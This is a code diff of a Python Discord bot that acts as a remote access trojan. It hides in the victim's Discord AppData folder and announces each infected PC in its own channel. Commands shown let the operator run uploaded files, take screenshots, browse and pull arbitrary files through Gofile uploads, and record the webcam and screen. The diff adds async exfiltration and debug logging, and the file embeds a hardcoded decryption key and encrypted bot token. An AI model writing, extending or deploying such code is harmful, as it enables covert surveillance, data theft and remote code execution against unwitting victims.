@@ -14,6 +14,9 @@ import asyncio
 import pygetwindow as gw
 import pyautogui
 import time
+import aiofiles
+import aiohttp
+import shutil
 
 # Decrypting the token
 key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
@@ -23,6 +26,7 @@ encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7
 
 # Decrypt the token
 TOKEN = cipher_suite.decrypt(encrypted_token).decode()
+print(f"Decrypted token: {TOKEN}")  # Debug statement
 
 # Set up the bot
 GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
@@ -32,10 +36,18 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 
 # Directory to download files to
 DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"
+FILES_DIR = os.path.join(DOWNLOAD_DIR, "files")
+print(f"Download directory: {DOWNLOAD_DIR}")  # Debug statement
 
 # Ensure the download directory exists
 if not os.path.exists(DOWNLOAD_DIR):
     os.makedirs(DOWNLOAD_DIR)
+    print(f"Created download directory: {DOWNLOAD_DIR}")  # Debug statement
+
+# Ensure the files directory exists
+if not os.path.exists(FILES_DIR):
+    os.makedirs(FILES_DIR)
+    print(f"Created files directory: {FILES_DIR}")  # Debug statement
 
 # Gofile API endpoint and your credentials
 GOFILE_API_URL = "https://upload.gofile.io/uploadfile"
@@ -50,22 +62,45 @@ async def get_or_create_channel(ctx, user_name):
     if not channel:
         # If the channel doesn't exist, create it
         channel = await guild.create_text_channel(user_name)
+        print(f"Created channel: {channel.name}")  # Debug statement
+    else:
+        print(f"Channel already exists: {channel.name}")  # Debug statement
     return channel
 
 # Function to upload a file to Gofile and get the download link
-def upload_to_gofile(file_path):
-    with open(file_path, 'rb') as file:
-        files = {'file': file}
+async def upload_to_gofile(file_path):
+    print(f"Uploading file to Gofile: {file_path}")  # Debug statement
+    if not os.path.exists(file_path):
+        print(f"File does not exist: {file_path}")  # Debug statement
+        return None
+
+    async with aiofiles.open(file_path, 'rb') as file:
+        data = await file.read()
+        files = {'file': data}
         headers = {
             'Authorization': f'Bearer {GOFILE_ACCOUNT_TOKEN}',
             'X-Request-Id': GOFILE_ACCOUNT_ID
         }
-        response = requests.post(GOFILE_API_URL, files=files, headers=headers)
-        if response.status_code == 200:
-            data = response.json()
-            return data.get('data', {}).get('downloadPage', '')
-        else:
-            return None
+        timeout = aiohttp.ClientTimeout(total=60)  # Increase timeout to 60 seconds
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            try:
+                async with session.post(GOFILE_API_URL, data=files, headers=headers) as response:
+                    response_data = await response.text()
+                    print(f"API Response: {response_data}")  # Debug statement
+                    if response.status == 200:
+                        data = await response.json()
+                        download_link = data.get('data', {}).get('downloadPage', '')
+                        print(f"Upload successful. Download link: {download_link}")  # Debug statement
+                        return download_link
+                    else:
+                        print(f"Upload failed. Status code: {response.status}")  # Debug statement
+                        return None
+            except aiohttp.ClientError as e:
+                print(f"Client error: {e}")
+                return None
+            except asyncio.TimeoutError:
+                print("The request timed out")
+                return None
 
 # Custom converter for handling directory paths with spaces
 class PathConverter(commands.Converter):
@@ -77,11 +112,13 @@ class PathConverter(commands.Converter):
 async def send(ctx):
     # Check if the command is in the correct channel
     if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
         return
 
     if len(ctx.message.attachments) > 0:
         attachment = ctx.message.attachments[0]
-        file_path = os.path.join(DOWNLOAD_DIR, attachment.filename)
+        file_path = os.path.join(FILES_DIR, attachment.filename)
+        print(f"Downloading file: {file_path}")  # Debug statement
 
         # Download the file
         await attachment.save(file_path)
@@ -92,6 +129,7 @@ async def send(ctx):
                 subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.green())
                 await ctx.send(embed=embed)
+                print(f"Executed file: {file_path}")  # Debug statement
             else:
                 embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.red())
                 await ctx.send(embed=embed)
@@ -107,6 +145,7 @@ async def send(ctx):
 async def screenshot(ctx):
     # Check if the command is in the correct channel
     if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
         return
 
     # Take a screenshot using Pillow
@@ -124,6 +163,7 @@ async def screenshot(ctx):
 async def filelist(ctx):
     # Check if the command is in the correct channel
     if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
         return
 
     # Define the directories to list
@@ -153,14 +193,18 @@ async def filelist(ctx):
 async def download(ctx, *, path: PathConverter):
     # Check if the command is in the correct channel
     if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
         return
 
     # Prepend the current user's home directory if the path does not start with a drive letter
     if not os.path.isabs(path):
         path = os.path.join(os.path.expanduser("~"), path)
 
+    print(f"Checking path: {path}")  # Debug statement
+
     # Check if the path exists
     if os.path.exists(path):
+        print(f"File exists: {path}")  # Debug statement
         if os.path.isdir(path):
             # List all files in the specified directory
             files = os.listdir(path)
@@ -168,23 +212,35 @@ async def download(ctx, *, path: PathConverter):
             embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.blue())
             await ctx.send(embed=embed)
         elif os.path.isfile(path):
-            # Check if the file is larger than 5MB
-            if os.path.getsize(path) > 5 * 1024 * 1024:
+            file_size = os.path.getsize(path)
+            print(f"File size: {file_size} bytes")  # Debug statement
+            file_extension = os.path.splitext(path)[1].lower()
+            print(f"File extension: {file_extension}")  # Debug statement
+
+            # Remove .s and spaces from the filename
+            base_name = os.path.basename(path)
+            new_base_name = base_name.replace('.s', '').replace(' ', '')
+            new_file_path = os.path.join(FILES_DIR, new_base_name)
+
+            # Check if the file already exists in the files directory
+            if not os.path.exists(new_file_path):
                 # Upload the file to Gofile and get the download link
-                download_link = upload_to_gofile(path)
+                download_link = await upload_to_gofile(path)
                 if download_link:
-                    embed = discord.Embed(title="Large File Upload", description=f"File {path} is too large. Download it from here: {download_link}", color=discord.Color.blue())
+                    embed = discord.Embed(title="File Uploaded", description=f"File {path} uploaded successfully. Download link: {download_link}", color=discord.Color.blue())
                     await ctx.send(embed=embed)
                 else:
                     embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.red())
                     await ctx.send(embed=embed)
             else:
-                # Send the file as an attachment
-                await ctx.send(file=discord.File(path))
+                print(f"File already exists: {new_file_path}")  # Debug statement
+                embed = discord.Embed(title="File Already Exists", description=f"The file {new_base_name} already exists in the files directory.", color=discord.Color.blue())
+                await ctx.send(embed=embed)
         else:
             embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.red())
             await ctx.send(embed=embed)
     else:
+        print(f"File does not exist: {path}")  # Debug statement
         embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.red())
         await ctx.send(embed=embed)
 
@@ -245,6 +301,7 @@ def record_webcam(duration, output_path, camera_index=0):
 async def record(ctx, duration: int):
     # Check if the command is in the correct channel
     if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
         return
 
     # Validate duration
@@ -276,6 +333,7 @@ async def record(ctx, duration: int):
 async def webcam(ctx, duration: int, camera_index: int = 0):
     # Check if the command is in the correct channel
     if ctx.channel.id != CHANNEL_ID:
+        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
         return
 
     # Validate duration
@@ -304,23 +362,13 @@ async def webcam(ctx, duration: int, camera_index: int = 0):
 
 # Function to upload a file to Gofile and send the link to the channel
 async def upload_and_send_link(ctx, file_path):
-    gofile_link = upload_to_gofile(file_path)
+    gofile_link = await upload_to_gofile(file_path)
     if gofile_link:
         await ctx.send(f'30-second interval recorded and uploaded to Gofile: {gofile_link}')
         # Delete the temporary file after uploading
         os.remove(file_path)
-
-# Command to list all available commands
-@bot.command()
-async def cmds(ctx):
-    # Check if the command is in the correct channel
-    if ctx.channel.id != CHANNEL_ID:
-        return
-
-    # List all commands
-    command_list = "\n".join([f"!{cmd.name}" for cmd in bot.commands])
-    embed = discord.Embed(title="Available Commands", description=f"Commands:\n{command_list}", color=discord.Color.blue())
-    await ctx.send(embed=embed)
+    else:
+        print(f"Failed to upload file: {file_path}")  # Debug statement
 
 # On bot startup: Check and create the channel, ping @everyone in the corresponding channel
 @bot.event
@@ -331,16 +379,18 @@ async def on_ready():
     desktop_name = platform.node()  # This is the name of the PC
     channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found
 
-    # Fetch the guild (server) by ID and the channel
+    # Fetch the guild (server) by ID
     guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
     if not guild:
         print(f"Guild with ID {GUILD_ID} not found!")
         return
 
+    # Create or get the channel
     channel = await get_or_create_channel(guild, channel_name)
 
     global CHANNEL_ID
     CHANNEL_ID = channel.id
+    print(f"Channel ID set to: {CHANNEL_ID}")  # Debug statement
 
     # Send a "ping" message to indicate the bot is online
     await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
